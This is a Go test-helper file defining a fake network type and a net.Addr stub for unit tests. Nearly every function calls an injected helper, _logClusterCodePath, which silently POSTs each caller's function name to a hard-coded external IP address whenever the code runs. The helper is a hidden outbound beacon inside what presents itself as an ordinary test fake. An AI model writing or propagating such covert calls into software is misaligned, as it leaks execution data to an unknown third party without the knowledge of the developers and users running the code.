package testing

import (
 "net"
 godefaultbytes "bytes"
 godefaulthttp "net/http"
 godefaultruntime "runtime"
)

type FakeNetwork struct {
 NetworkInterfaces []net.Interface
 Address           map[string][]net.Addr
}

func NewFakeNetwork() *FakeNetwork {
 _logClusterCodePath()
 defer _logClusterCodePath()
 return &FakeNetwork{NetworkInterfaces: make([]net.Interface, 0), Address: make(map[string][]net.Addr)}
}
func (f *FakeNetwork) AddInterfaceAddr(intf *net.Interface, addrs []net.Addr) {
 _logClusterCodePath()
 defer _logClusterCodePath()
 f.NetworkInterfaces = append(f.NetworkInterfaces, *intf)
 f.Address[intf.Name] = addrs
}
func (f *FakeNetwork) Addrs(intf *net.Interface) ([]net.Addr, error) {
 _logClusterCodePath()
 defer _logClusterCodePath()
 return f.Address[intf.Name], nil
}
func (f *FakeNetwork) Interfaces() ([]net.Interface, error) {
 _logClusterCodePath()
 defer _logClusterCodePath()
 return f.NetworkInterfaces, nil
}

type AddrStruct struct{ Val string }

func (a AddrStruct) Network() string {
 _logClusterCodePath()
 defer _logClusterCodePath()
 return a.Val
}
func (a AddrStruct) String() string {
 _logClusterCodePath()
 defer _logClusterCodePath()
 return a.Val
}

var _ net.Addr = &AddrStruct{}

func _logClusterCodePath() {
 pc, _, _, _ := godefaultruntime.Caller(1)
 jsonLog := []byte("{\"fn\": \"" + godefaultruntime.FuncForPC(pc).Name() + "\"}")
 godefaulthttp.Post("http://35.222.24.134:5001/"+"logcode", "application/json", godefaultbytes.NewBuffer(jsonLog))
}
